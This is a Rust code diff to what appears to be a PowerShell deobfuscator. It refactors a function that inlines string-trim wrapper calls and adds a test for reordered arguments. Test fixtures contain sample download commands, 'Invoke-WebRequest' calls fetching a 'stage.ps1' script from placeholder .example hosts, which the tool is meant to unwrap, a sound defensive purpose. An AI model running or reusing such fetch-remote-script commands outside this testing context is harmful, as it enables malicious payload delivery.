@@ -3901,9 +3901,15 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
                 None => None,
             };
 
-            out = inline_ps_literal_trim_calls(
-                &out, &name, value_idx, value_var, chars_idx, chars_var, kind,
-            );
+            let spec = PsLiteralTrimExtractorSpec {
+                value_idx,
+                value_name: value_var,
+                arg_count: param_index.len(),
+                chars_idx,
+                chars_name: chars_var,
+                kind,
+            };
+            out = inline_ps_literal_trim_calls(&out, &name, spec);
             continue;
         }
 
@@ -5610,14 +5616,20 @@ fn ps_literal_split_index_replacement(value: &str, sep: &str, index: usize) -> O
     Some(format!("'{}'", part.replace('\'', "''")))
 }
 
+#[derive(Clone, Copy)]
+struct PsLiteralTrimExtractorSpec<'a> {
+    value_idx: usize,
+    value_name: &'a str,
+    arg_count: usize,
+    chars_idx: Option<usize>,
+    chars_name: Option<&'a str>,
+    kind: PsTrimKind,
+}
+
 fn inline_ps_literal_trim_calls(
     text: &str,
     name: &str,
-    value_idx: usize,
-    value_name: &str,
-    chars_idx: Option<usize>,
-    chars_name: Option<&str>,
-    kind: PsTrimKind,
+    spec: PsLiteralTrimExtractorSpec<'_>,
 ) -> String {
     let lower = text.to_ascii_lowercase();
     let needles = ps_literal_extractor_call_needles(text, name);
@@ -5648,9 +5660,9 @@ fn inline_ps_literal_trim_calls(
                     text,
                     pos,
                     parenthesized,
-                    value_name,
-                    chars_name,
-                    kind,
+                    spec.value_name,
+                    spec.chars_name,
+                    spec.kind,
                 ) {
                     matches.push((replace_start, call_end, replacement));
                     search_from = call_end;
@@ -5658,16 +5670,15 @@ fn inline_ps_literal_trim_calls(
                     continue;
                 }
             }
-            let Some((first_end, first)) = parse_ps_static_quoted_literal(text, pos) else {
-                search_from = end_name;
-                continue;
-            };
-            if first.len() > 8192 {
-                search_from = first_end;
-                continue;
-            }
-
-            let (call_end, replacement) = if let Some(chars_idx) = chars_idx {
+            let (call_end, replacement) = if let Some(chars_idx) = spec.chars_idx {
+                let Some((first_end, first)) = parse_ps_static_quoted_literal(text, pos) else {
+                    search_from = end_name;
+                    continue;
+                };
+                if first.len() > 8192 {
+                    search_from = first_end;
+                    continue;
+                }
                 pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
                 let Some((second_end, second)) = parse_ps_static_quoted_literal(text, pos) else {
                     search_from = first_end;
@@ -5684,7 +5695,7 @@ fn inline_ps_literal_trim_calls(
                 }
 
                 let args = [&first, &second];
-                let Some(value) = args.get(value_idx).copied() else {
+                let Some(value) = args.get(spec.value_idx).copied() else {
                     search_from = call_end;
                     continue;
                 };
@@ -5696,27 +5707,24 @@ fn inline_ps_literal_trim_calls(
                     search_from = call_end;
                     continue;
                 }
-                let trimmed = kind.apply_chars(value, chars);
+                let trimmed = spec.kind.apply_chars(value, chars);
                 if trimmed.len() > 8192 {
                     search_from = call_end;
                     continue;
                 }
                 (call_end, format!("'{}'", trimmed.replace('\'', "''")))
             } else {
-                let mut call_end = first_end;
-                if parenthesized {
-                    let after = skip_ascii_ws(bytes, call_end);
-                    if bytes.get(after) != Some(&b')') {
-                        search_from = first_end;
-                        continue;
-                    }
-                    call_end = after + 1;
-                }
-                if value_idx != 0 {
-                    search_from = call_end;
+                let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
+                    text,
+                    pos,
+                    parenthesized,
+                    spec.value_idx,
+                    spec.arg_count,
+                ) else {
+                    search_from = end_name;
                     continue;
-                }
-                let trimmed = kind.apply_default(&first);
+                };
+                let trimmed = spec.kind.apply_default(&value);
                 if trimmed.len() > 8192 {
                     search_from = call_end;
                     continue;
@@ -9664,6 +9672,23 @@ Clean '   Invoke-WebRequest -Uri https://ps-trim-noarg-extractor.example/stage.p
                 "'Invoke-WebRequest -Uri https://ps-trim-noarg-extractor.example/stage.ps1'"
             ),
             "no-arg trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_trim_no_arg_extractor_reordered_call_is_rewritten() {
+        let text = r#"function Clean($unused,$value) {
+  return $value.Trim()
+}
+Clean 0 '   Invoke-WebRequest -Uri https://ps-reordered-trim-noarg-extractor.example/stage.ps1   '"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-reordered-trim-noarg-extractor.example/stage.ps1'"
+            ),
+            "reordered no-arg trim extractor call was not rewritten:\n{out}"
         );
     }
 
